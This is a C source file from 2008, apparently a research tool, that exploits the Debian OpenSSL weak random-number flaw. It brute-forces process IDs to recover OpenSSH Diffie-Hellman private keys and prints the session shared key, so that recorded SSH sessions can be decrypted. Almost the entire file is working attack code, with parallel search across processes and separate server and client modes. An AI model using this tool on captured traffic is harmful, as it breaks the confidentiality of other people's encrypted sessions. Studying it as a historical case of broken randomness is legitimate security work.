/*
 * OpenSSH Diffie-Hellman key exchange key generation
 * to decrypt recorded SSH sessions where Debian's weak
 * openssl RNG was used
 *
 * Copyright 2008 Raphaël Rigo 
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
*/
#include <limits.h>
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <openssl/dh.h>
#include <openssl/bn.h>
#include <openssl/rand.h>

//#define DEBUG

#define str(x) #x
#define xstr(x) str(x)
#define DEFAULT_PIX_MAX 32768
#define PID_MAX_LIMIT (4 * 1024 * 1024)

#ifdef DEBUG
	#define debug(fmt, args...) fprintf(stderr, fmt , ## args)
#else
	#define debug(fmt, args...) do {} while (0)
#endif

#define fatal(str) { fprintf(stderr, (str)); exit(1); }

unsigned char dummy[(1024+CHAR_BIT-1)/CHAR_BIT]; 
BIGNUM *bn_dummy; // Dummy bignum for BN_rand calls
int	brute_child = 0;

void usage()
{
	printf("\t-s : server mode\n");
	printf("\t-c : client mode\n");
	printf("\t-k key : weak DH key\n");
	printf("\t-K key : other DH key\n");
	printf("\t-b bits : private key size in bits\n");
	printf("\t-r N : server RSA modulus (don't specify if DSA)\n");
	printf("\t-G generator : generator\n");
	printf("\t-P prime : prime\n");
	printf("\t-p start-end : PID range\n");
	printf("\t-n processes : Number of processes\n");
	printf("\t-h NUM : bruteforce child PID (until PPID+NUM) in server mode\n");
}

void print_result(BIGNUM *other_pubkey, DH *dh)
{
	unsigned char *shared_key;
	int size, i;

	debug("Found ! :");
	BN_print_fp(stdout, dh->priv_key);
	printf("\n");
	shared_key = (unsigned char *) malloc(DH_size(dh));
	if (shared_key == NULL)
		fatal("malloc failed");
	debug("Shared key : ");
	size = DH_compute_key(shared_key, other_pubkey, dh);
	if (size == -1)
		fatal("DH_compute_key failed");
	for (i = 0; i < size; i++)
		printf("%02x", shared_key[i]);
	printf("\n");
	free(shared_key);

	return;
}

/*
 * Build DH 
 * P length (big endian) | P | G length | G
 */
DH *make_dh(BIGNUM *g, BIGNUM *p)
{
	DH *dh;


	dh = DH_new();

	if (dh == NULL)
		fatal("DH_new failed");

	/* Faster computations in OpenSSL */
	dh->flags |= DH_FLAG_NO_EXP_CONSTTIME;

	dh->p = p;
	dh->g = g; 

#ifdef DEBUG
	printf("P : ");
	BN_print_fp(stdout, dh->p);
	printf("\nG : ");
	BN_print_fp(stdout, dh->g);
	printf("\n");
#endif
	
	/* Alloc here to avoid repeated allocation while bruteforcing */
	dh->priv_key = BN_new();
	if (dh->priv_key == NULL)
		fatal("priv_key BN_new");

	return dh;
}


/* Generate private DH key using the specified group
 *
 * This will of course only work if a weak openssl library is used
 * and the pid overwritten
 *
 * bits is calculated in OpenSSH depending on the available ciphers
 */
int do_client(BIGNUM *key, BIGNUM *other_pubkey, int bits, DH *dh)
{
	debug("Client mode\n");

	/* First 20 rand bytes for arc4random init */
	RAND_bytes(dummy, 20);

	BN_rand(dh->priv_key, bits, 0, 0);
	if(DH_generate_key(dh) == 0)
		fatal("DHgen error\n");

#ifdef DEBUG
	BN_print_fp(stdout, dh->pub_key);
	printf("\n");
#endif

	if (BN_cmp(key, dh->pub_key) == 0) {
		print_result(other_pubkey, dh);
		return 1;
	}
	return 0;
}

int do_server(pid_t pid, BIGNUM *key, BIGNUM *other_pubkey, int bits, DH *dh, BIGNUM *n)
{
	char pidstr[12];  // I want to kill myself for that, sorry - jt
	int i = 0, status, retval = 0;
	pid_t chld = 0;

	debug("Server mode\n");
	RAND_status();	// will do a RAND_poll and thus some RAND_add
			// called in seed_rng() (entropy.c), called in main()

	// BN_rand_range in RSA blinding can make several calls to BN_rand
	// if n is NULL, for example in case of a DSA server key, don't do this
	if (n)
		BN_rand_range(bn_dummy, n);

	/* 20 rand bytes for arc4random init */
	RAND_bytes(dummy, 20);

	// THE SERVER FORKS HERE
	if (!brute_child) {
		snprintf(pidstr, sizeof(pidstr), "%d", pid+1);
		debug("child PID : %d\n",pid+1);
		setenv("FAKEPID", pidstr, 1);
	} else {
		i = 0;
		do { 
			snprintf(pidstr, sizeof(pidstr), "%d", (pid+i)%DEFAULT_PIX_MAX);
			debug("child PID : %d\n",(pid+i)%DEFAULT_PIX_MAX);
			setenv("FAKEPID", pidstr, 1);
			// We fork so we can bruteforce the child's PID without 
			// having to recompute the whole RNG state
			if ((chld = fork())) {
				waitpid(chld, &status, 0);
				if (WIFEXITED(status) && WEXITSTATUS(status) == 1)  {
					return 1;
				}
			} else {
				break;
			}
		} while (i++ < brute_child);
		if (chld)
			return 0;
	}
	
	/* RAND_seed in SSH child */
	RAND_seed(dummy, 1024);

	BN_rand(dh->priv_key, bits, 0, 0);
	if(DH_generate_key(dh) == 0)
		fatal("DHgen error\n");

#ifdef DEBUG
	printf("Generated pub key :\n");
	BN_print_fp(stdout, dh->pub_key);
	printf("\n");
#endif

	if (BN_cmp(key, dh->pub_key) == 0) {
		print_result(other_pubkey, dh);
		retval = 1;
	}

	if (brute_child)
		exit(retval);
	else
		return retval;
}

int do_range(BIGNUM *key, BIGNUM *other_pubkey, DH *dh, BIGNUM *rsa_n, int bits, int client, int start, int end)
{
	pid_t pid;
	char pidstr[12];  // I want to kill myself for that, sorry - jt
	int retval = 0;

	bn_dummy = BN_new();

	if (bn_dummy == NULL)
		fatal("BN_new failed");
	
	for (pid = start; pid <= end; pid++) {
		snprintf(pidstr, sizeof(pidstr), "%d", pid);
		debug("PID : %d\n",pid);
		setenv("FAKEPID", pidstr, 1);

		if (client) {
			if (do_client(key, other_pubkey, bits, dh)) {
				printf("PID : %d\n", pid);
				retval = 1;
				break;
			}
			// This one must be patched !
			// TODO : fork to avoid openssl patch
			RAND_cleanup();
		} else {
			RAND_cleanup();
			if (do_server(pid, key, other_pubkey, bits, dh, rsa_n)) {
				printf("PID : %d\n", pid);
				retval = 1;
				break;
			}
		}
	}
	fprintf(stderr, "\r"
		//      "PID : 0123456"
		        "             \r");
	BN_free(bn_dummy);
	return retval;
}

int fork_bruteforce(int start, int end, int n_cpu,
		BIGNUM *pubkey, BIGNUM *other_pubkey, DH *dh, BIGNUM *rsa_n, int bits, int client)
{
	int ihasfound = 0;
	int total, np, nremain, i;
	pid_t *pids;
	int status, chld, nchild;

	total = end-start+1;
	np = total/n_cpu; 
	nremain = total%n_cpu;

	pids = (pid_t *) malloc(n_cpu*sizeof(pid_t));
	if (pids == NULL)
		fatal("Malloc failed!\n");

	for (i = 0; i < n_cpu; i++) {
		if (nremain) {
			end = start+np;
			nremain--;
		} else
			end = start+np-1;
		
		debug("start : %d, end : %d\n", start,end);
		switch (chld = fork()) {
			case 0 :
				// child
				exit(do_range(pubkey, other_pubkey, dh, rsa_n, bits, client, start, end));
				break;
			case -1 :
				fatal("Fork failed !\n");
				break;
			default:
				//parent
				pids[i] = chld;

		}
		start = end+1;
	}

	// Wait for completion
	nchild = n_cpu;
	while(nchild) {
		chld = waitpid(-1, &status, 0);
		debug("wait returned pid %d\n", chld);
		if (WIFEXITED(status)) {
			//normal exit
			if (WEXITSTATUS(status) == 0) {
				// not found
				for (i=0 ; i<n_cpu ; i++) {
					if (pids[i] == chld) {
						pids[i] = -1;
						nchild --;
					}
				}
			} else {
				ihasfound = 1;
				// found, kill other processes
				for (i=0 ; i<n_cpu ; i++) {
					if (pids[i] != chld && pids[i] != -1) {
						debug("killing %d\n", pids[i]);
						kill(pids[i], SIGKILL);
					}
				}
				nchild = 0;
			}
		}
	}
	free(pids);

	return !ihasfound;
}

int main(int argc, char *argv[])
{
	int ch, bits;
	char *sep;
	int start, end, n_cpu;
	int retval;
	char client;
	DH *dh;
	BIGNUM *pubkey = NULL;
	BIGNUM *other_pubkey = NULL;
	BIGNUM *rsa_n = NULL;
	BIGNUM *generator = NULL;
	BIGNUM *prime = NULL;

	debug("Debian openssl vulnerability : SSH key exchange\n");

	client = bits = start = end = 0;
	n_cpu = 1;
	while ((ch = getopt(argc, argv, "scG:P:h:k:K:b:p:n:r:")) != -1) {
		switch (ch) {
		case 'k':
			if (BN_hex2bn(&pubkey, optarg) == 0)
				fatal("Weak key parsing failed");
			break;
		case 'c':
			client = 1;	
			break;
		case 's':
			client = 0;
			break;
		case 'G':
			if (BN_hex2bn(&generator, optarg) == 0)
				fatal("Generator parsing failed");
			break;
		case 'P':
			if (BN_hex2bn(&prime, optarg) == 0)
				fatal("Prime parsing failed");
			break;
		case 'b':
			bits = strtoul(optarg, NULL, 0);
			break;
		case 'K':
			if (BN_hex2bn(&other_pubkey, optarg) == 0)
				fatal("Other key parsing failed");
			break;
		case 'r':
			if (BN_hex2bn(&rsa_n, optarg) == 0)
				fatal("RSA Modulus parsing failed");
			break;
		case 'p':
			sep = strchr(optarg, '-');
			if (sep == NULL)
				end = 0x7fff;
			else
				end = strtoul(sep+1, NULL, 0);
			start = strtoul(optarg, NULL, 0);
			if (start < 0 || end < start)
				fatal("Invalid PID range !\n");
			if (end > PID_MAX_LIMIT)
				fatal("Invalid PID range, PID_MAX_LIMIT is "xstr(PID_MAX_LIMIT)"!\n");
			debug("PID range : %d-%d\n", start, end);
			break;
		case 'n':
			n_cpu = strtoul(optarg, NULL, 0);
			if (n_cpu < 1)
				fatal("Invalid number of CPU!\n");
			break;
		case 'h':
			brute_child = strtoul(optarg, NULL, 0);
			if (brute_child <= 0)
				brute_child = PID_MAX_LIMIT;
			break;
		default:
			usage();
		}
	}
	if (!generator || !prime) {
		fatal("Group infos are mandatory !\n");
	}
	if (!pubkey) {
		fatal("Key is mandatory !\n");
	}
	if (!bits) {
		fatal("Private key size is mandatory!\n");
	}
	if (!start && !end) {
		fatal("PID range is mandatory\n");
	}
	
	dh = make_dh(generator, prime);

	retval = fork_bruteforce(start, end, n_cpu, pubkey, other_pubkey, dh, rsa_n, bits, client);
	
	DH_free(dh);
	BN_free(rsa_n);
	BN_free(pubkey);

	return retval;
}
